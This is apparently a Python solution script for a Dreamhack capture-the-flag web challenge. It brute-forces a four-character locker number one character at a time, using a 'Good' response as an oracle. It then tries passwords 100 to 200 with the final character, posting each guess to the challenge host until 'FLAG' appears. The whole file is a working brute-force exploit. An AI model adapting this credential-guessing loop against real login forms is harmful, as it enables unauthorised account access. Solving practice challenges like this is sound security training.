import random
import string
import requests
import itertools

rand_str = ""
first = "" 
second = ""
third = ""
fourth = ""
alphanumeric = string.ascii_lowercase + string.digits

def brute():
    for i in range(100):
        random2 = str(random.choice(alphanumeric))
        #print(random2)
        data = {
            'locker_num': random2,
            'password': '123'
        }

        res = requests.post('http://host8.dreamhack.games:10083/', data=data)
        #print(res.text)         # 서버가 보낸 HTML 내용 출력

        if 'Good' in res.text : 
            print('first = ', random2)
            first = random2
            break

    i = 0 # 변수 초기화

    for i in range(100):
        random2 = str(random.choice(alphanumeric))
        #print(random2)
        data = {
            'locker_num': first + random2,
            'password': '123'
        }

        res = requests.post('http://host8.dreamhack.games:10083/', data=data)
        #print(res.text)         # 서버가 보낸 HTML 내용 출력

        if 'Good' in res.text : 
            print('second = ', random2)
            second = random2
            break

    i = 0 # 변수 초기화

    for i in range(100):
        random2 = str(random.choice(alphanumeric))
        #print(random2)
        data = {
            'locker_num': first + second + random2,
            'password': '123'
        }

        res = requests.post('http://host8.dreamhack.games:10083/', data=data)
        #print(res.text)         # 서버가 보낸 HTML 내용 출력

        if 'Good' in res.text : 
            print('third = ', random2)
            third = random2
            break

    i = 0 # 변수 초기화

    for i in itertools.count(): # 마지막 자리는 prefix를 이용 못하기 때문에 brute로 마지막 자리와 password까지 한 번에 맞춰야 함.
        random2 = str(random.choice(alphanumeric))
        for pw in range(100,201):
            data = {
            'locker_num': first + second + third + random2,
            'password': pw
            }

            res = requests.post('http://host8.dreamhack.games:10083/', data=data)
            #print(res.text)         # 서버가 보낸 HTML 내용 출력

            if 'FLAG' in res.text : 
                print('data = ', data)
                fourth = random2
                return

brute()
